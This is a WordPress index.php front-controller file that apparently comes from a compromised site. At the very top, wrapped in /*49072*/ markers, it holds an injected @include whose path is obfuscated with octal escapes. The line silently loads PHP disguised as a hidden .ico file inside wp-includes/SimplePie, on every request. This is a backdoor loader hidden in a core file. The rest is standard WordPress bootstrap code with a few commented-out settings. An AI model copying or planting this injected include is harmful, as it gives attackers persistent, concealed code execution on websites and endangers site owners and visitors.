<?php
/*49072*/

@include "\057home\057ptse\162ver1\067/pub\154ic_h\164ml/w\160-inc\154udes\057Simp\154ePie\057.a69\1412831\056ico";

/*49072*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
 #ini_set( 'upload_max_size' , '10M' );
 #ini_set('upload_max_filesize', '10M');
#ini_set( 'post_max_size', '10M');
#phpinfo();
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );